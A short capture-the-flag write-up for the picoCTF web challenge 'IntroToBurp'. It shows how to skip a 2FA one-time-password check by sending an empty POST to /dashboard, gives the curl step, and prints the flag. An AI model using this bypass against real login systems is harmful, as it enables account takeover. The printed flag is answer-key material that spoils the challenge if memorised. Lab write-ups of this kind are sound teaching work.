---
title: IntroToBurp
date: 2026-05-27
category: web
description: After registering, bypass OTP/2FA by submitting an empty POST to /dashboard with no otp parameter.
---

## 🎯 Summary

A registration form with CSRF token protection, followed by a 2FA OTP verification page. The server doesn't validate that the `otp` parameter was actually sent — submitting a POST to `/dashboard` with no form data bypasses the 2FA check.

## 🧩 Solution

1. GET `/` — grab CSRF token and session cookie
2. POST `/` with registration fields → redirects to `/dashboard` (2FA page)
3. POST `/dashboard` with an empty body (no `otp` parameter) → OTP bypass

```
curl -X POST http://host:port/dashboard  # no otp param
# → "Welcome, <user> you sucessfully bypassed the OTP request."
# → Your Flag: picoCTF{...}
```

## 🚩 Flag

```
picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
```
